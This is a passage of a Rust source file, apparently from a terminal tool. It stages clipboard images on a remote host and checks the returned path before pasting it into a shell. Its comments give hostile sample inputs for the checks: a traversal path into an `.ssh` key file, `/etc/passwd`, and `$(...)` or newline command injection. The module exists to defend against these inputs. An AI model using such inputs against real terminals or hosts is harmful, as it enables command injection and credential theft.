//! Client half of the stage-then-inject file RPC: correlating an in-flight
//! `ClipboardStageRequest` with the mount it was sent to, and turning the
//! remote host's answer into a local paste.
//!
//! Three invariants shape this module.
//!
//! 1. **The returned path is hostile input.** It arrives from another host and
//!    is about to be handed to `TerminalRuntime::try_send_paste`, which sends
//!    the string to the PTY *raw* whenever the pane has not enabled bracketed
//!    paste (`pane::PaneRuntime::paste_payload`). A `\n` therefore means Enter
//!    and `$(...)` means command substitution on the agent's shell line. The
//!    path is re-validated against the same predicate the staging host used,
//!    and rejected — never rewritten — when it does not match.
//! 2. **A response must prove which connection it belongs to.** Neither
//!    `mount_generation` (a constant on both peers) nor `server_instance_id`
//!    (minted per remote *process*, so a remount to a still-running remote
//!    reuses it) can distinguish a fresh mount from a superseded one. The
//!    locally minted `MountConnectionEpoch` can, so every pending entry stores
//!    the epoch it was minted under and every answer is fenced against it.
//! 3. **Nothing fails silently.** A stage that is refused, times out, returns
//!    an unusable path, or cannot be delivered to its pane all raise a toast.
//!    The last case matters most: the remote host has already written the file,
//!    so a dropped error leaves a real artifact nobody will ever reference.

use std::collections::HashSet;
use std::time::{Duration, Instant};

use crate::app::App;
use crate::events::AppEvent;
use crate::layout::PaneId;
use crate::remote::federation::client::{MountConnectionEpoch, StageSendError};
use crate::remote::federation::file_staging::{
    is_injection_safe_path, FEDERATION_CLIPBOARD_PREFIX,
};
use crate::remote::federation::id::HostKey;
use crate::remote::federation::protocol::{ClipboardStageFailure, ClipboardStageRequest};
use crate::remote::federation::sanitize::sanitize_remote_string;

/// Local context a `ClipboardStageRequest` was minted from, held until its
/// answer arrives, its budget expires, or its mount goes away.
pub(crate) struct PendingClipboardStage {
    /// Stable workspace id (`Workspace::id`), not a `Vec` index — indices
    /// shift when workspaces close, so an index here could inject a path into
    /// an unrelated workspace that later occupies the same slot.
    pub(crate) workspace_id: String,
    /// The pane resolved when the request was sent, never re-resolved from
    /// whatever is focused when the answer arrives: a slow transfer gives the
    /// user plenty of time to move focus, and the paste belongs to the pane
    /// that asked for it.
    pub(crate) target_pane_id: PaneId,
    /// The mount this request was actually sent to. `request_id` comes from a
    /// bare process-wide counter and is therefore guessable, so an answer is
    /// only honored when it arrives tagged with this same host.
    pub(crate) origin: HostKey,
    /// Which connection to `origin` sent this request. See the module docs.
    pub(crate) connection_epoch: MountConnectionEpoch,
    /// Decoded payload size, kept so the budget this entry was given can be
    /// explained in logs after the fact.
    pub(crate) payload_len: usize,
    /// When this request stops being worth waiting for.
    pub(crate) deadline: Instant,
}

/// Fixed part of a stage's budget: connection setup, the remote's filesystem
/// work, and the answer's trip back, none of which scale with payload size.
const STAGE_TIMEOUT_BASE: Duration = Duration::from_secs(12);

/// Throughput a stage is assumed to achieve at worst. Deliberately pessimistic
/// — an SSH tunnel over a poor mobile link — because the cost of guessing too
/// low is a false "no answer in time" on a paste that was actually working,
/// while the cost of guessing too high is only a longer wait before an
/// unanswerable request is cleaned up. At this rate the 16 MiB ceiling gets
/// about 64s on top of the base.
const STAGE_ASSUMED_MIN_THROUGHPUT_BYTES_PER_SEC: u64 = 256 * 1024;

/// Concurrent stages allowed per mount. The mount's out-tx is an unbounded
/// channel, so this cap is the only thing bounding client memory: each stage
/// pins the raw bytes, their base64 form, and the encoded frame at once. The
/// transfers are serialised on the wire anyway, so a deeper queue would buy
/// latency nothing and cost tens of megabytes of resident memory.
const MAX_IN_FLIGHT_STAGES_PER_MOUNT: usize = 2;

/// How long a stage may run before the user is told it is still working. Short
/// enough to answer "did my paste do anything?", long enough that a normal
/// screenshot on a normal link never raises it.
pub(crate) const SLOW_STAGE_TOAST_DELAY: Duration = Duration::from_millis(1500);

pub(crate) const TOAST_TITLE_FAILED: &str = "image paste failed";
pub(crate) const TOAST_TITLE_SAVING: &str = "saving image to remote host…";

/// Budget a stage of `payload_len` decoded bytes gets before it is abandoned.
///
/// Proportional rather than fixed: a fixed budget tuned on loopback expires
/// mid-transfer on a real multi-megabyte paste over SSH, which turns a working
/// paste into a spurious failure toast *and* leaves the remote host writing a
/// file nobody will reference.
pub(crate) fn stage_timeout_budget(payload_len: usize) -> Duration {
    let transfer = Duration::from_secs_f64(
        payload_len as f64 / STAGE_ASSUMED_MIN_THROUGHPUT_BYTES_PER_SEC as f64,
    );
    STAGE_TIMEOUT_BASE.saturating_add(transfer)
}

/// Why a returned path was refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PathRejection {
    Empty,
    NotAbsolute,
    LineBreak,
    ControlByte,
    MissingStagingPrefix,
    DisallowedCharacter,
    /// A `.` or `..` component anywhere in the path.
    RelativeComponent,
}

/// Why a stage request never reached the wire.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum StageStartError {
    /// This pane is not backed by a live federation mount.
    NoLiveMount,
    /// The mount's peer never advertised the staging capability.
    CapabilityNotAgreed,
    /// The mount's writer is gone.
    LinkClosed,
    /// This mount already has as many stages in flight as it is allowed.
    TooManyInFlight,
}

/// Mints a fresh, process-wide-unique `ClipboardStageRequest::request_id`.
fn next_clipboard_stage_request_id() -> u64 {
    static NEXT_ID: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
    NEXT_ID.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

/// Validates a path a remote host says it staged, before it is pasted.
///
/// Ordered, and every step rejects rather than repairs: a repaired path is a
/// path the remote did not write, so injecting it would name a file that does
/// not exist while hiding the fact that the remote misbehaved.
pub(crate) fn sanitize_returned_remote_path(path: &str) -> Result<&str, PathRejection> {
    // The codec is JSON, so the string is UTF-8 by construction, and the
    // staging host refuses to stage under a root it cannot render losslessly.
    // Both facts are about a well-behaved peer; the checks below are not.
    if path.is_empty() {
        return Err(PathRejection::Empty);
    }
    if !path.starts_with('/') {
        return Err(PathRejection::NotAbsolute);
    }
    // Every other check below reads either the whole string or only its final
    // component, so without this one an absolute, control-free, allowlist-clean
    // path whose *last* component carries the staging prefix could still walk
    // out of the staging directory —
    // `/tmp/staging/../../home/me/.ssh/federation-clipboard-key` names a file
    // the remote never staged. Rejected rather than normalised: resolving the
    // traversal here would produce a path the remote did not write and hide the
    // fact that it answered a question it was not asked.
    if path
        .split('/')
        .any(|component| component == "." || component == "..")
    {
        return Err(PathRejection::RelativeComponent);
    }
    // Named ahead of the general control-byte check even though that check
    // subsumes it: this is the byte that means Enter on an unbracketed PTY,
    // and it deserves a guard that fails on its own if it is ever weakened.
    if path.contains('\n') || path.contains('\r') {
        return Err(PathRejection::LineBreak);
    }
    if sanitize_remote_string(path) != path {
        return Err(PathRejection::ControlByte);
    }
    // The client asked for a staged file, so only a staged file is an
    // acceptable answer. Anything else — /etc/passwd, or a file the *local*
    // clipboard writer happens to have put in the same shared directory — is
    // the remote answering a question it was not asked.
    let staged_name = path
        .rsplit('/')
        .next()
        .is_some_and(|name| name.starts_with(FEDERATION_CLIPBOARD_PREFIX));
    if !staged_name {
        return Err(PathRejection::MissingStagingPrefix);
    }
    // The same predicate the staging host validated its own root and file name
    // against, so a well-behaved remote can never produce a path this rejects.
    // Control bytes are already gone; this is what stops a space, `;`, `|`,
    // `$`, or a backtick from reaching an unbracketed shell line.
    if !is_injection_safe_path(path) {
        return Err(PathRejection::DisallowedCharacter);
    }
    Ok(path)
}

impl App {
    /// Sends the clipboard image behind `target_pane_id`'s mount for staging
    /// and records what its answer will need in order to be injected.
    ///
    /// Fire-and-forget by necessity: the answer arrives on the mount's drive
    /// task as an `AppEvent`, so the local layout context has to be remembered
    /// here rather than awaited.
    pub(crate) fn begin_remote_clipboard_stage(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        image: &crate::platform::ClipboardImage,
    ) -> Result<(), StageStartError> {
        let budget = stage_timeout_budget(image.bytes.len());
        self.begin_remote_clipboard_stage_with_timings(
            ws_idx,
            target_pane_id,
            image,
            SLOW_STAGE_TOAST_DELAY,
            budget,
        )
    }

    /// The body of [`App::begin_remote_clipboard_stage`], with the two waits it
    /// schedules supplied rather than baked in.
    ///
    /// Both are timers on a real clock, and the shipped budget starts at 12
    /// seconds, so a test that could not shorten them could only assert that
    /// the events they raise are *handled* correctly — never that anything
    /// schedules them at all.
    pub(crate) fn begin_remote_clipboard_stage_with_timings(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        image: &crate::platform::ClipboardImage,
        slow_toast_delay: Duration,
        budget: Duration,
    ) -> Result<(), StageStartError> {
        // Same resolution shape the remote split request uses: the pane's own
        // runtime is what knows whether it rides a live mount at all.
        let out_tx = self
            .state
            .workspaces
            .get(ws_idx)
            .and_then(|ws| ws.terminal_id(target_pane_id))
            .cloned()
            .and_then(|terminal_id| self.terminal_runtimes.get(&terminal_id))
            .and_then(|runtime| runtime.remote_out_tx());
        let (Some(out_tx), Some(origin)) = (out_tx, self.federation_host_key_for_workspace(ws_idx))
        else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };
        let Some(workspace_id) = self.state.workspaces.get(ws_idx).map(|ws| ws.id.clone()) else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };

        let in_flight = self
            .pending_remote_clipboard_stages
            .values()
            .filter(|pending| pending.origin == origin)
            .count();
        if in_flight >= MAX_IN_FLIGHT_STAGES_PER_MOUNT {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "two image pastes are already in flight; wait for one",
            );
            return Err(StageStartError::TooManyInFlight);
        }

        let Some(mirror) = self.state.remote_mirrors.get(&origin) else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };
        let connection_epoch = mirror.connection_epoch();
        let request_id = next_clipboard_stage_request_id();
        let payload_len = image.bytes.len();
        let request = ClipboardStageRequest {
            request_id,
            payload_base64: {
                use base64::Engine as _;
                base64::engine::general_purpose::STANDARD.encode(&image.bytes)
            },
            original_filename: format!("image.{}", image.extension),
        };

        if let Err(err) = crate::remote::federation::client::send_clipboard_stage_request(
            mirror, &out_tx, request,
        ) {
            let (context, error) = match err {
                StageSendError::CapabilityNotAgreed => (
                    "the remote host does not support image paste",
                    StageStartError::CapabilityNotAgreed,
                ),
                StageSendError::LinkClosed => (
                    "the remote mount's link is closing; try again",
                    StageStartError::LinkClosed,
                ),
            };
            self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, context);
            return Err(error);
        }

        self.pending_remote_clipboard_stages.insert(
            request_id,
            PendingClipboardStage {
                workspace_id,
                target_pane_id,
                origin: origin.clone(),
                connection_epoch,
                payload_len,
                deadline: Instant::now() + budget,
            },
        );

        // Tell the user the paste is still working once the transfer has run
        // long enough to look like nothing happened. Without it the natural
        // response to the silence is to paste again, which the in-flight cap
        // then refuses — a self-inflicted failure. The handler looks the
        // request up, so a stage that finished first raises nothing.
        let slow_events = self.event_tx.clone();
        tokio::spawn(async move {
            tokio::time::sleep(slow_toast_delay).await;
            let _ = slow_events
                .send(AppEvent::FederationClipboardStageStillRunning { request_id })
                .await;
        });

        // One sleep per request, so cancelling or resolving one never disturbs
        // another. A timeout for an already-resolved request finds no entry and
        // is a logged no-op, which is why the task needs no cancellation handle.
        let events = self.event_tx.clone();
        tokio::spawn(async move {
            tokio::time::sleep(budget).await;
            let _ = events
                .send(AppEvent::FederationClipboardStageTimedOut {
                    request_id,
                    origin,
                    connection_epoch,
                })
                .await;
        });
        Ok(())
    }

    /// Removes and returns a pending stage. The `remove` *is* the claim: an
    /// entry that comes back here can never be resolved a second time.
    fn take_pending_remote_clipboard_stage(
        &mut self,
        request_id: u64,
    ) -> Option<PendingClipboardStage> {
        self.pending_remote_clipboard_stages.remove(&request_id)
    }

    /// Drops pending stages belonging to one connection to one host.
    ///
    /// Keyed by epoch as well as host so a delayed teardown notice from a
    /// superseded connection cannot destroy the in-flight work of a fresh
    /// remount to the same host.
    pub(crate) fn purge_pending_remote_clipboard_stages_for_origin(
        &mut self,
        origin: &HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        self.pending_remote_clipboard_stages.retain(|_, pending| {
            &pending.origin != origin || pending.connection_epoch != connection_epoch
        });
    }

    /// Drops pending stages targeting one of the given (closing) workspaces,
    /// so a late answer cannot inject into whatever later occupies the slot.
    pub(crate) fn purge_pending_remote_clipboard_stages_for_workspaces(
        &mut self,
        workspace_ids: &HashSet<String>,
    ) {
        self.pending_remote_clipboard_stages
            .retain(|_, pending| !workspace_ids.contains(&pending.workspace_id));
    }

    /// Peeks at a pending entry and confirms the answer came from the mount
    /// and connection that asked. Deliberately does not remove: `request_id`
    /// is a guessable counter, so a remove-first design would let one mount
    /// evict another mount's pending entry with an echoed id, after which the
    /// legitimate answer would find nothing and vanish without a trace.
    fn pending_stage_answer_is_valid(
        &self,
        request_id: u64,
        origin: &HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> bool {
        let Some(pending) = self.pending_remote_clipboard_stages.get(&request_id) else {
            tracing::warn!(
                request_id,
                "dropping a file-staging answer for an unknown or already-resolved request"
            );
            return false;
        };
        if &pending.origin != origin {
            tracing::warn!(
                request_id,
                expected_origin = %pending.origin,
                got_origin = %origin,
                "dropping a file-staging answer from a mount that did not originate this request"
            );
            return false;
        }
        if pending.connection_epoch != connection_epoch {
            tracing::warn!(
                request_id,
                ?connection_epoch,
                "dropping a file-staging answer from a connection that has been superseded"
            );
            return false;
        }
        true
    }

    /// `AppEvent::FederationClipboardStageReady` handler: the remote host says
    /// it wrote the file and this is where it put it.
    pub(crate) fn handle_federation_clipboard_stage_ready(
        &mut self,
        request_id: u64,
        remote_path: String,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        if !self.pending_stage_answer_is_valid(request_id, &origin, connection_epoch) {
            return;
        }
        let Some(pending) = self.take_pending_remote_clipboard_stage(request_id) else {
            return;
        };

        let path = match sanitize_returned_remote_path(&remote_path) {
            Ok(path) => path.to_string(),
            Err(rejection) => {
                tracing::warn!(
                    request_id,
                    ?rejection,
                    "refusing to paste a path the remote host returned"
                );
                self.raise_clipboard_stage_toast(
                    TOAST_TITLE_FAILED,
                    "the remote host returned an unusable path",
                );
                return;
            }
        };

        let terminal_id = self
            .state
            .workspaces
            .iter()
            .find(|ws| ws.id == pending.workspace_id)
            .and_then(|ws| ws.terminal_id(pending.target_pane_id))
            .cloned();
        let Some(terminal_id) = terminal_id else {
            tracing::warn!(
                request_id,
                workspace_id = %pending.workspace_id,
                "the remote host staged a file but its target pane is gone"
            );
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "the pane that asked for this paste is gone",
            );
            return;
        };
        let Some(runtime) = self.terminal_runtimes.get(&terminal_id) else {
            tracing::warn!(
                request_id,
                "the remote host staged a file but its target pane has no runtime"
            );
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "the pane that asked for this paste is gone",
            );
            return;
        };

        // The remote side has already succeeded here: the file exists on its
        // filesystem and the pending entry is claimed, so nothing downstream
        // can retry or time this out. A dropped error would therefore read to
        // the user as a paste that did nothing, while the remote artifact sits
        // there consuming quota until the sweep — so both arms are reported.
        match runtime.try_send_paste(path) {
            Ok(()) => {
                tracing::debug!(
                    request_id,
                    payload_len = pending.payload_len,
                    // An answer that beat its own budget only just barely is
                    // worth seeing in a log when someone is tuning the budget.
                    past_deadline = Instant::now() > pending.deadline,
                    "pasted a remotely staged file path"
                );
            }
            Err(err) => {
                let kind = match err {
                    tokio::sync::mpsc::error::TrySendError::Full(_) => "full",
                    tokio::sync::mpsc::error::TrySendError::Closed(_) => "closed",
                };
                tracing::warn!(
                    request_id,
                    pane_id = ?pending.target_pane_id,
                    kind,
                    "a remotely staged file path could not be delivered to its pane"
                );
                self.raise_clipboard_stage_toast(
                    TOAST_TITLE_FAILED,
                    "pane was not ready to receive the path; paste again",
                );
            }
        }
    }

    /// `AppEvent::FederationClipboardStageFailed` handler: the remote host
    /// refused or could not stage the file.
    pub(crate) fn handle_federation_clipboard_stage_failed(
        &mut self,
        request_id: u64,
        failure: ClipboardStageFailure,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        if !self.pending_stage_answer_is_valid(request_id, &origin, connection_epoch) {
            return;
        }
        if self
            .take_pending_remote_clipboard_stage(request_id)
            .is_none()
        {
            return;
        }
        tracing::warn!(request_id, ?failure, "remote file staging failed");
        self.raise_clipboard_stage_toast(
            TOAST_TITLE_FAILED,
            clipboard_stage_failure_context(failure),
        );
    }

    /// `AppEvent::FederationClipboardStageTimedOut` handler. Raised locally,
    /// so there is no foreign claimant to fence against and the `remove` can
    /// come first.
    pub(crate) fn handle_federation_clipboard_stage_timed_out(
        &mut self,
        request_id: u64,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        let Some(pending) = self.take_pending_remote_clipboard_stage(request_id) else {
            tracing::debug!(
                request_id,
                "a file-staging budget expired for a request that already resolved"
            );
            return;
        };
        tracing::warn!(
            request_id,
            %origin,
            ?connection_epoch,
            payload_len = pending.payload_len,
            "a file-staging request outlived its budget with no answer"
        );
        self.raise_clipboard_stage_toast(
            TOAST_TITLE_FAILED,
            "the remote host did not answer in time",
        );
    }

    /// Raises the "still working" affordance, but only while the request it
    /// belongs to is genuinely unresolved.
    pub(crate) fn raise_slow_stage_toast_if_pending(&mut self, request_id: u64) {
        if !self
            .pending_remote_clipboard_stages
            .contains_key(&request_id)
        {
            return;
        }
        self.raise_clipboard_stage_toast(TOAST_TITLE_SAVING, "the image is still on its way");
    }

    /// Surfaces a stage outcome through whichever notification channel the
    /// user configured, matching how a failed remote split is surfaced.
    pub(crate) fn raise_clipboard_stage_toast(&mut self, title: &str, context: &str) {
        match self.state.toast_config.delivery {
            crate::config::ToastDelivery::Herdr => {
                self.state.toast = Some(crate::app::state::ToastNotification {
                    kind: crate::app::ToastKind::NeedsAttention,
                    title: title.to_string(),
                    context: context.to_string(),
                    position: None,
                    target: None,
                });
            }
            // One arm per delivery rather than a shared guard that re-matches
            // the same value: re-matching needs a catch-all the compiler cannot
            // prove dead, and a panicking catch-all on the event loop would
            // take the whole TUI down.
            crate::config::ToastDelivery::Terminal if self.local_terminal_notifications => {
                let _ = crate::terminal_notify::show_notification(title, Some(context));
            }
            crate::config::ToastDelivery::System if self.local_terminal_notifications => {
                let _ = crate::platform::show_desktop_notification(title, Some(context));
            }
            _ => {}
        }
        self.render_dirty.request_generic();
        self.render_notify.notify_one();
    }
}

/// User-facing explanation for each way a remote host can refuse a stage.
///
/// An exhaustive `match` with no catch-all, deliberately: a failure variant
/// added later must be given words here rather than silently inheriting some
/// other variant's, which is how a user ends up told that a retryable queue
/// limit was a disk failure. Kept within a single toast line.
pub(crate) fn clipboard_stage_failure_context(failure: ClipboardStageFailure) -> &'static str {
    match failure {
        ClipboardStageFailure::InvalidFilename => "the remote host rejected the file name",
        ClipboardStageFailure::UnsupportedExtension => {
            "the remote host does not accept this image type"
        }
        ClipboardStageFailure::InvalidPayload => "the image data did not survive the trip",
        ClipboardStageFailure::PayloadTooLarge => "the image is too large for the remote host",
        ClipboardStageFailure::QuotaExceeded => "the remote host's paste storage is full",
        ClipboardStageFailure::StagingUnavailable => "the remote host has no usable temp folder",
        ClipboardStageFailure::Busy => "the remote host is busy; paste again in a moment",
        ClipboardStageFailure::WriteFailed => "the remote host could not write the file",
    }
}

// ---------------------------------------------------------------------------
// Input interception: a clipboard image pasted onto a federated remote pane
// ---------------------------------------------------------------------------
//
// Pasting an image while a mounted remote workspace's pane is focused has to
// write the file on the *remote* host, because that is where the agent reading
// it runs. The staging half of that lives above; this half decides which local
// input means "paste an image here" and starts the off-loop clipboard read.
//
// It lives on the App rather than in the TUI client because the decision needs
// two facts only the server holds: which mount a workspace mirrors
// (`AppState::remote_mirrors`) and whether that mount's peer negotiated
// `FILE_STAGING`. Neither is projected to a client today, and projecting them
// would be a wire change.
//
// Pre-merge (fork `src/app/input/mod.rs`, deleted by the v0.9.0 runtime/client
// migration) the same intercept ran on the App's own key loop and resolved its
// target from "the active workspace's focused pane". The entry point is now
// `intercept_remote_image_paste_events`, driven from the server's client-shell
// pane-input path, which has already resolved the exact workspace and pane the
// input is addressed to — so the target is taken from the caller instead of
// re-derived from focus, and a press can no longer race a focus change.

/// Toast context for a mount whose peer never negotiated file staging.
pub(crate) const TOAST_REMOTE_TOO_OLD: &str =
    "remote herdr is too old for image paste; update it";

/// Toast context for a press whose clipboard holds no pasteable image.
const TOAST_NO_CLIPBOARD_IMAGE: &str = "clipboard has no image (png/jpg/gif/webp/bmp)";

/// Toast context for an image the wire refuses before it is ever sent.
const TOAST_IMAGE_TOO_LARGE: &str = "image is over 16MB, herdr's remote paste limit";

/// Toast context for a clipboard owner that never answered the read.
const TOAST_CLIPBOARD_READ_TIMED_OUT: &str = "the clipboard did not answer; try again";

/// How long a clipboard read may run before the press is abandoned.
///
/// Needed because the read talks to another process on the user's machine —
/// an X11 selection owner that has stopped servicing requests never answers at
/// all — and without a bound the press would simply never resolve, leaving the
/// user with no image and no explanation. Generous enough that a healthy
/// clipboard holding a large screenshot is never cut off.
const CLIPBOARD_IMAGE_READ_TIMEOUT: Duration = Duration::from_secs(5);

/// Runs `read` off the caller's thread and reports the outcome as an event.
///
/// Returns as soon as the work is scheduled, which is the whole point: the
/// caller is the single App event loop, and everything it drives — rendering,
/// every pane's output, the API loop — stops for exactly as long as it stays
/// inside a synchronous clipboard read.
///
/// A read that outlives `timeout` is abandoned rather than cancelled. Blocking
/// work cannot be interrupted, so the thread runs to completion and its result
/// is discarded; what matters is that the user is told, and that a wedged
/// clipboard owner holds nothing but one pool thread.
pub(crate) fn spawn_clipboard_image_capture<F>(
    events: tokio::sync::mpsc::Sender<AppEvent>,
    workspace_id: String,
    target_pane_id: PaneId,
    timeout: Duration,
    read: F,
) where
    F: FnOnce() -> Option<crate::platform::ClipboardImage> + Send + 'static,
{
    use crate::events::ClipboardImageCapture;

    tokio::spawn(async move {
        let capture = match tokio::time::timeout(timeout, tokio::task::spawn_blocking(read)).await {
            Ok(Ok(Some(image))) => ClipboardImageCapture::Image(image),
            Ok(Ok(None)) => ClipboardImageCapture::NoImage,
            Ok(Err(err)) => {
                tracing::warn!(%err, "the clipboard image read did not complete");
                ClipboardImageCapture::NoImage
            }
            Err(_) => ClipboardImageCapture::ReadTimedOut,
        };
        let _ = events
            .send(AppEvent::RemoteClipboardImageCaptured {
                workspace_id,
                target_pane_id,
                capture,
            })
            .await;
    });
}

/// Whether the workspace at `ws_idx` is a live federation mount, and if so
/// whether that mount's peer agreed to `FILE_STAGING`.
///
/// `None` means "not a federated workspace" and is the answer on every local
/// pane, so it is also the fast path: a workspace with no federation space
/// membership never touches the mirror table.
fn mount_file_staging_support(
    state: &crate::app::state::AppState,
    ws_idx: usize,
) -> Option<bool> {
    use crate::remote::federation::protocol::Capability;

    // A federated workspace carries the mount's host key in its space
    // membership; matching it against the live mirrors is what distinguishes
    // "this workspace came from a remote host" from "this workspace is local".
    let host_key = state
        .workspaces
        .get(ws_idx)?
        .worktree_space()?
        .key
        .strip_prefix("federation:")?;
    // Compared against the borrowed key rather than formatting a
    // `federation:`-prefixed string per mirror: this runs on the pane input
    // path, once per input event per keystroke.
    let mirror = state
        .remote_mirrors
        .iter()
        .find(|(candidate, _)| candidate.as_str() == host_key)
        .map(|(_, mirror)| mirror)?;
    Some(mirror.supports(&Capability::new(Capability::FILE_STAGING)))
}

/// What a key press means for the remote image-paste intercept. Exactly three
/// outcomes, and only one of them claims the key.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum RemoteImagePasteDecision {
    /// Not this intercept's key, or not a federated pane. The press is left
    /// completely alone.
    FallThrough,
    /// A mounted remote pane whose peer never agreed to file staging. The
    /// feature cannot work on this pane for the life of the mount, so the key
    /// is *not* claimed: it goes on to the pane app as usual, and the reason
    /// is reported once per pane so the press does not merely look ignored.
    Unsupported,
    /// A mounted remote pane on a peer that can stage files.
    Capture,
}

/// Decides what a key press means for the remote image-paste intercept.
///
/// Pure, and deliberately so: the branch that must never be taken by accident
/// is the one that consumes a key, and a pure function makes each condition
/// assertable without a clipboard, a mount, or a running event loop.
pub(crate) fn remote_image_paste_decision(
    state: &crate::app::state::AppState,
    ws_idx: usize,
    key: &crate::input::TerminalKey,
) -> RemoteImagePasteDecision {
    let Some(binding) = state.remote_image_paste_key else {
        return RemoteImagePasteDecision::FallThrough;
    };
    if !crate::config::terminal_key_matches_combo(key, binding) {
        return RemoteImagePasteDecision::FallThrough;
    }
    match mount_file_staging_support(state, ws_idx) {
        None => RemoteImagePasteDecision::FallThrough,
        Some(false) => RemoteImagePasteDecision::Unsupported,
        Some(true) => RemoteImagePasteDecision::Capture,
    }
}

/// What a bracketed-paste payload means for the remote image-path bridge:
/// does the pasted text have the exact shape of a local image file the
/// terminal substituted for a clipboard image (see `crate::image_path`),
/// landing on a federated remote pane?
///
/// Deliberately conservative in the same spirit as `remote_image_paste_decision`:
/// `FallThrough` covers every case where the paste should still reach the
/// remote PTY as ordinary text, including a local pane, a non-federated
/// workspace, or text that merely looks like a path. Unlike the keybinding
/// intercept, an unmatched shape is not itself suspicious — most pastes are
/// text — so only a *shape match* against a peer that lacks `FILE_STAGING`
/// raises `Unsupported`; anything that never matched the shape falls through
/// untouched.
pub(crate) enum BracketedPasteImageDecision {
    FallThrough,
    Unsupported,
    Capture {
        /// Canonicalized candidate for the OFF-LOOP read: the decision only
        /// shape-checks and gates on the drop location; the caller hands this
        /// path to `begin_remote_clipboard_image_capture` so the up-to-16MiB
        /// file read never runs on the App event loop, and the read itself
        /// re-proves temp-dir containment against the opened fd
        /// (`crate::image_path::read_verified_image_drop_file`).
        path: std::path::PathBuf,
        extension: &'static str,
    },
}

pub(crate) fn bracketed_paste_image_decision(
    state: &crate::app::state::AppState,
    ws_idx: usize,
    text: &str,
) -> BracketedPasteImageDecision {
    let Some(supports_file_staging) = mount_file_staging_support(state, ws_idx) else {
        return BracketedPasteImageDecision::FallThrough;
    };
    let Some((path, extension)) = crate::image_path::local_image_path_from_text(text) else {
        return BracketedPasteImageDecision::FallThrough;
    };
    // Ordinary paste content triggers this path, unlike the dedicated
    // keybinding, so the shape match alone is not enough evidence: the
    // candidate must also sit in a location only a clipboard-image drop would
    // use, never a path the user typed or pasted on purpose. This on-loop
    // check is advisory (cheap syscalls, decides interception vs
    // fall-through only); the authoritative containment proof is re-run
    // against the opened fd inside `read_verified_image_drop_file` during the
    // off-loop read, so a symlink swapped in after this point cannot widen
    // what gets bridged.
    let Some(canonical_path) = crate::image_path::recognized_image_drop_location(&path) else {
        tracing::debug!(
            path = %path.display(),
            "bracketed paste: image path is not in a recognized drop location"
        );
        return BracketedPasteImageDecision::FallThrough;
    };
    if !supports_file_staging {
        return BracketedPasteImageDecision::Unsupported;
    }
    BracketedPasteImageDecision::Capture {
        path: canonical_path,
        extension,
    }
}

/// What a remote image-paste intercept decided about one piece of local input
/// — a key press or a bracketed paste payload — in the only terms its callers
/// care about: does that input still belong to the pane?
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum RemoteImagePasteKeyDisposition {
    /// Not claimed. Keep dispatching exactly as if the intercept did not exist.
    Forward,
    /// Claimed. The input must not reach the pane.
    Consume,
}

/// Whether a claimed image paste reached the wire. The key is consumed either
/// way — the user asked for an image paste on a remote pane, and answering
/// with a raw `Ctrl-V` to the remote PTY would be worse than a toast.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ImagePasteOutcome {
    /// The request is on the wire; its answer arrives as an `AppEvent`.
    Staged,
    /// Refused locally, and the user was told why.
    Rejected,
}

/// The clipboard reader the intercept hands to the off-loop capture.
///
/// A seam rather than a direct call to `crate::platform::read_clipboard_image`
/// so that "one physical press starts exactly one clipboard read" is
/// assertable: the real reader spawns `osascript` on macOS and a chain of
/// `wl-paste`/`xclip` on Linux, so a test that counts reads would otherwise
/// spawn one child process per counted read and read the developer's own
/// clipboard.
#[cfg(not(test))]
fn clipboard_image_reader() -> fn() -> Option<crate::platform::ClipboardImage> {
    crate::platform::read_clipboard_image
}

/// Test build: answers "no image" instantly, touching no OS clipboard. Every
/// started read still resolves into exactly one
/// `AppEvent::RemoteClipboardImageCaptured` on the App's own event channel, so
/// counting those events counts the reads an input path launched — per App,
/// and therefore isolated between tests running in the same process.
#[cfg(test)]
fn clipboard_image_reader() -> fn() -> Option<crate::platform::ClipboardImage> {
    || None
}

/// Could this one input event possibly be an image-paste trigger?
///
/// The cheapest question that can rule an event out, and the only thing that
/// runs per event on the ordinary-typing path: a pair of enum comparisons,
/// no allocation, no state beyond the binding the caller already read.
///
/// A key is a candidate purely because its *code* equals the binding's code.
/// Full modifier and shifted-codepoint matching is deliberately left to the
/// slow path a candidate unlocks, so that ordinary typing never builds a
/// `TerminalKey` — the letter bound to the paste key (`v` by default) is the
/// only one that pays for it, and even then only on a federated pane.
fn is_image_paste_candidate(
    event: &crate::protocol::ClientPaneInputEvent,
    binding: Option<(crossterm::event::KeyCode, crossterm::event::KeyModifiers)>,
) -> bool {
    use crate::protocol::ClientPaneInputEvent;

    match event {
        ClientPaneInputEvent::Key { code, .. } => {
            binding.is_some_and(|(binding_code, _)| code.to_crossterm() == binding_code)
        }
        // An empty bracketed paste is the image-paste trigger some terminals
        // emit for Cmd+V on an image-only clipboard, so the same binding
        // governs it — `keys.remote_image_paste = ""` must turn both off.
        ClientPaneInputEvent::Paste(text) if text.is_empty() => binding.is_some(),
        // A non-empty paste may be a terminal-substituted image *path*, a
